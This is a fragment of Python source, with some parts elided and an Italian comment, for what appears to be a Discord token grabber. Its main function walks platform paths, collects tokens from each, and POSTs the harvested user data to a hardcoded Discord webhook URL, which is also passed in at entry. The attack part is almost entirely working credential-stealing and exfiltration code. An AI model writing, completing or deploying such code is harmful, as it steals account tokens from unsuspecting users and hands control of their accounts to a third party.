...
def main(webhook_url):
    # Qui ci va il codice che userà la variabile webhook_url
    print("Il webhook è:", webhook_url)
    checked = []
    ...
    for platform, path in PATHS.items():
        ...
        for token in gettokens(path):
            ...
            try:
                ...
                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1407028462572671097/15H6R0i93d7yfzX4iZ8Gbc5pkCcEfkPu6BnRWY8A9ScFgG5lgrrl0qsUqh5jaLYjGQQ-', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
...
if __name__ == "__main__":
    main("https://discord.com/api/webhooks/1407028462572671097/15H6R0i93d7yfzX4iZ8Gbc5pkCcEfkPu6BnRWY8A9ScFgG5lgrrl0qsUqh5jaLYjGQQ-")
